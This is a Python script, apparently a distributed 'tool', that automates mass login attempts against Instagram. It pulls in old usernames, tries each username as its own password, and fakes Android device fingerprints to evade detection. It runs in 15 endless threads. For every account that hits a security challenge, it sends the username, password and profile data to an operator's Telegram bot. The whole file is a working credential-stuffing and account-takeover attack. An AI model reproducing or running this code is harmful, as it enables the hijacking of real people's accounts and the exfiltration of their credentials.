import requests, time, random, uuid, secrets,os,datetime
from urllib.parse import urlencode
import requests, os, random, json
from uuid import uuid4
from threading import Thread
from instagramtolle import instagram
from ms4 import InfoIG
#— — — — — — — — — — — — —
an = datetime.datetime.now()
an2 = datetime.datetime(2025, 5, 7, 0, 00, 00)
if an > an2 or an == an2:
        exit("\n Tool I stopped • @PyWaTa ")
else:
        pass
#— — — — — — — — — — — — —
session = requests.Session()
good, bad, sec = 0, 0, 0
R, G, Y, C, W, S = '\033[91m', '\033[92m', '\033[93m', '\033[96m', '\033[97m', '\033[0m'
#— — — — — — — — — — — — —
tokf=input(' - Enter Token : ')
idf=input(' - Enter Id : ')
#— — — — — — — — — — — — —
def info(username, password):
    h=InfoIG.Instagram_Info(username)
    name=h['Name']
    user=h['Username']
    id=h['ID']
    fol=h['Followers']
    folg=h['Following']
    bio=h['Bio']
    post=h['Posts']
    privet=h['Is Private']    
    try:
        reset_status = instagram.Reset(username).get("data", {}).get("reset", 'Unknown')
    except:
        reset_status = 'Unknown'
    msg = f'''
- New Secure Insta 
— — — — — — — — — — — — —
< User - {username} >
< Pass - {password} >
< Reset - {reset_status} >
< Name - {name} >
< Followers - {fol} >
< Following - {folg} >
< Bio - {bio} >
< Id - {id}
< Posts - {post} >
< Privet - {privet} >

< programmer - @PyWaTa >
— — — — — — — — — — — — —
'''
    try:
        requests.post(f"https://api.telegram.org/bot{tokf}/sendMessage", data={"chat_id": idf, "text": msg})
    except:
        pass
#— — — — — — — — — — — — —                
def generate_data():
    rnd = str(random.randint(150, 999))
    Blockversion = secrets.token_hex(16)
    IgFamilyDeviceId = uuid.uuid4()
    AndroidID = f'android-{secrets.token_hex(8)}'
    IgDeviceId = uuid.uuid4()
    PigeonSession = f'UFS-{uuid.uuid4()}-0'
    App = ''.join(random.choices('1234567890', k=15))
    user_agent = (
        "Instagram 311.0.0.32.118 Android (" +
        random.choice(["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"]) + "; " +
        str(random.randint(100, 1300)) + "dpi; " +
        str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " +
        random.choice(["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"]) + "; SM-T" +
        rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
    )
    return Blockversion, IgFamilyDeviceId, AndroidID, IgDeviceId, PigeonSession, App, user_agent
#— — — — — — — — — — — — —
def get_tokens(Blockversion, IgFamilyDeviceId, AndroidID, IgDeviceId, PigeonSession, user_agent):
    data = urlencode({
        'device_id': str(AndroidID),
        'custom_device_id': str(IgDeviceId),
    })

    headers = {
        'X-Pigeon-Session-Id': str(PigeonSession),
        'X-Pigeon-Rawclienttime': str(round(time.time(), 3)),
        'X-Ig-Bandwidth-Speed-Kbps': f'{random.randint(1000, 9999)}.000',
        'X-Ig-Bandwidth-Totalbytes-B': str(random.randint(10000000, 99999999)),
        'X-Ig-Bandwidth-Totaltime-Ms': str(random.randint(10000, 99999)),
        'X-Bloks-Version-Id': str(Blockversion),
        'X-Ig-Device-Id': str(IgDeviceId),
        'X-Ig-Android-Id': str(AndroidID),
        'User-Agent': user_agent,
        'Content-Length': str(len(data)),
    }

    try:
        session.post('https://b.i.instagram.com/api/v1/zr/tokens/', headers=headers, data=data)
    except Exception:
        return None

    headers['X-Ig-Family-Device-Id'] = str(IgFamilyDeviceId)
    try:
        session.post('https://b.i.instagram.com/api/v1/zr/tokens/', headers=headers, data=data)
    except Exception:
        return None

    data2 = f'signed_body=SIGNATURE.%7B%22phone_id%22%3A%22{IgFamilyDeviceId}%22%2C%22usage%22%3A%22prefill%22%7D'
    headers['Content-Length'] = str(len(data2))
    try:
        session.post('https://b.i.instagram.com/api/v1/accounts/contact_point_prefill/',
                     headers=headers, data=data2)
    except Exception:
        return None

    data3 = urlencode({
        'signed_body': 'SIGNATURE.{"bool_opt_policy":"0","mobileconfigsessionless":"","api_version":"3","unit_type":"1","query_hash":"1fe1eeee83cc518f2c8b41f7deae1808ffe23a2fed74f1686f0ab95bbda55a0b","device_id":"'
                       + str(IgDeviceId) + '","fetch_type":"ASYNC_FULL","family_device_id":"' + str(IgFamilyDeviceId).upper() + '"}'
    })
    headers['Content-Length'] = str(len(data3))

    try:
        response = session.post('https://b.i.instagram.com/api/v1/launcher/mobileconfig/',
                                headers=headers, data=data3)
        return response.headers.get('ig-set-x-mid')
    except Exception:
        return None
#— — — — — — — — — — — — —
def login(username, password):
    global good, bad, sec
    Blockversion, IgFamilyDeviceId, AndroidID, IgDeviceId, PigeonSession, App, user_agent = generate_data()
    mid = get_tokens(Blockversion, IgFamilyDeviceId, AndroidID, IgDeviceId, PigeonSession, user_agent)
    if not mid:
        return

    data = {
        "signed_body=SIGNATURE._csrftoken": "missing",
        "adid": str(IgFamilyDeviceId),
        "country_codes": [{"country_code": "7", "source": ["default", "uig_via_phone_id"]}],
        "device_id": str(AndroidID),
        "google_tokens": [],
        "guid": str(IgDeviceId),
        "login_attempt_count": 0,
        "jazoest": str(random.randint(11111, 55555)),
        "phone_id": str(IgDeviceId),
        "username": str(username),
        "enc_password": f"#PWD_INSTAGRAM:0:{round(time.time(), 3)}:{password}"
    }

    headers = {
        'User-Agent': user_agent,
        'x-pigeon-session-id': str(PigeonSession),
        'x-ig-bandwidth-speed-kbps': str(random.randint(10000000, 99999999)),
        'x-bloks-version-id': str(Blockversion),
        'x-ig-device-id': str(IgDeviceId),
        'x-ig-bandwidth-totaltime-ms': str(random.randint(10000, 99999)),
        'x-ig-app-id': str(App),
        'x-mid': str(mid),
        'x-pigeon-rawclienttime': str(round(time.time(), 3)),
        'x-ig-bandwidth-totalbytes-b': str(random.randint(10000000, 99999999)),
        'x-ig-android-id': str(AndroidID),
    }

    try:
        rew = session.post('https://b.i.instagram.com/api/v1/accounts/login/',
                                headers=headers, data=data).text
        if '"challenge_required"' in rew:
            sec += 1
            os.system('clear')
            print(f"""
{W}— — — — — — — — — — — — —
• {C}Secure {W}: {Y}{sec}{S}
• {R}Bad    {W}: {R}{bad}{S}
• {Y}User : {username}

• Response : {rew}
{W}— — — — — — — — — — — — —
""")
            info(username, password)
        else:
            bad += 1
            os.system('clear')
            print(f"""
{W}— — — — — — — — — — — — —
• {C}Secure {W}: {Y}{sec}{S}
• {R}Bad    {W}: {R}{bad}{S}
• {Y}User : {username}

• Response : {rew}
{W}— — — — — — — — — — — — —
""")
    except Exception as w:
        print(f"{R}[ ERROR ]{S} {w}")
#— — — — — — — — — — — — —
def Thi():
    while True:
        try:
            a = instagram.generateUsername2013()
            username = a["data"]["username"]
            password = username
            login(username, password)
        except:
            continue
for _ in range(15):
    Thread(target=Thi).start()
